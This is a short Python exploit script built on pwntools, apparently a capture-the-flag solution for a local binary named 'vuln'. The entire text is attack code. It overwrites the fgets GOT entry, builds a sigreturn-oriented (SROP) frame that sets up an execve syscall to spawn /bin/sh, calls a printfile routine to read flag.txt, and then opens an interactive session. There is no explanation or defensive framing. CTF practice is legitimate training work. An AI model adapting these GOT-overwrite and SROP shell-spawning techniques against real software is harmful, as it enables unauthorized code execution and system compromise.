from pwn import *

context.binary = elf = ELF("./vuln")
conn = elf.process()
#gdb.attach(conn)
#conn = remote("localhost", 1337)
rop = ROP(elf)

payload = b"a"*8
payload += p64(0x404018 + 0x8) # fgets got
payload += p64(0x401142)
conn.sendline(payload)

frame = SigreturnFrame()
frame.rax = 59
frame.rip = 0x401198
frame.rdi = 0x404048 + 160
frame.rsi = 0
frame.rdx = 0
frame.rsp = u64(b"/bin/sh\0")

payload = b""
payload += p64(elf.sym.printfile) # goes into fgets got
payload += p64(0x404038) # flag.txt
payload += p64(0x401142)
payload += b"flag.txt"
payload += p64(0)
payload += p64(0x401198) # syscall
payload += bytes(frame)
conn.sendline(payload)

conn.interactive()
